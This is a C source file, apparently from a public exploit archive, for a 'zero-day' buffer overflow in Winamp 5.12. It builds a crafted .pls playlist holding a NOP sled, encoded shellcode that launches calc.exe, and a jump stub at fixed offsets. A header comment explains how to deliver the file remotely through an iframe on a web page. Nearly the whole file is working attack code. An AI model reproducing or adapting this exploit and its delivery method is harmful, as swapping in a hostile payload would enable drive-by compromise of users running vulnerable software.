/*
*
* Winamp 5.12 Remote Buffer Overflow Universal Exploit (Zero-Day)
* Bug discovered & exploit coded by ATmaCA
* Web: http://www.spyinstructors.com && http://www.atmacasoft.com
* E-Mail: atmaca@icqmail.com
* Credit to Kozan
*
*/

/*
*
* Tested with :
* Winamp 5.12 on Win XP Pro Sp2
*
*/

/*
* Usage:
*
* Execute exploit, it will create "crafted.pls" in current directory.
* Duble click the file, or single click right and then select "open".
* And Winamp will launch a Calculator (calc.exe)
*
*/

/*
*
* For to use it remotly,
* make a html page containing an iframe linking to the .pls file.
*
* http://www.spyinstructors.com/atmaca/research/winamp_ie_poc.htm
*
*/

#include <windows.h>
#include <stdio.h>

#define BUF_LEN 0x045D
#define PLAYLIST_FILE "crafted.pls"

char szPlayListHeader1[] = "[playlist]\r\nFile1=\\\\";
char szPlayListHeader2[] = "\r\nTitle1=~BOF~\r\nLength1=FFF\r\nNumberOfEntries=1\r\nVersion=2\r\n";

// Jump to shellcode
char jumpcode[] = "\x61\xD9\x02\x02\x83\xEC\x34\x83\xEC\x70\xFF\xE4";

// Harmless Calc.exe
char shellcode[] =
"\x54\x50\x53\x50\x29\xc9\x83\xe9\xde\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\x02"
"\xdd\x0e\x4d\x83\xee\xfc\xe2\xf4\xfe\x35\x4a\x4d\x02\xdd\x85\x08\x3e\x56\x72\x48"
"\x7a\xdc\xe1\xc6\x4d\xc5\x85\x12\x22\xdc\xe5\x04\x89\xe9\x85\x4c\xec\xec\xce\xd4"
"\xae\x59\xce\x39\x05\x1c\xc4\x40\x03\x1f\xe5\xb9\x39\x89\x2a\x49\x77\x38\x85\x12"
"\x26\xdc\xe5\x2b\x89\xd1\x45\xc6\x5d\xc1\x0f\xa6\x89\xc1\x85\x4c\xe9\x54\x52\x69"
"\x06\x1e\x3f\x8d\x66\x56\x4e\x7d\x87\x1d\x76\x41\x89\x9d\x02\xc6\x72\xc1\xa3\xc6"
"\x6a\xd5\xe5\x44\x89\x5d\xbe\x4d\x02\xdd\x85\x25\x3e\x82\x3f\xbb\x62\x8b\x87\xb5"
"\x81\x1d\x75\x1d\x6a\xa3\xd6\xaf\x71\xb5\x96\xb3\x88\xd3\x59\xb2\xe5\xbe\x6f\x21"
"\x61\xdd\x0e\x4d";


int main(int argc,char *argv[])
{
printf("\nWinamp 5.12 Remote Buffer Overflow Universal Exploit");
printf("\nBug discovered & exploit coded by ATmaCA");
printf("\nWeb: http://www.spyinstructors.com && http://www.atmacasoft.com");
printf("\nE-Mail: atmaca@icqmail.com");
printf("\nCredit to Kozan");

FILE *File;
char *pszBuffer;

if ( (File = fopen(PLAYLIST_FILE,"w+b")) == NULL ) {
printf("\n [Err:] fopen()");
exit(1);
}

pszBuffer = (char*)malloc(BUF_LEN);
memset(pszBuffer,0x90,BUF_LEN);
memcpy(pszBuffer,szPlayListHeader1,sizeof(szPlayListHeader1)-1);
memcpy(pszBuffer+0x036C,shellcode,sizeof(shellcode)-1);
memcpy(pszBuffer+0x0412,jumpcode,sizeof(jumpcode)-1);
memcpy(pszBuffer+0x0422,szPlayListHeader2,sizeof(szPlayListHeader2)-1);

fwrite(pszBuffer, BUF_LEN, 1,File);
fclose(File);

printf("\n\n" PLAYLIST_FILE " has been created in the current directory.\n");
return 1;
}

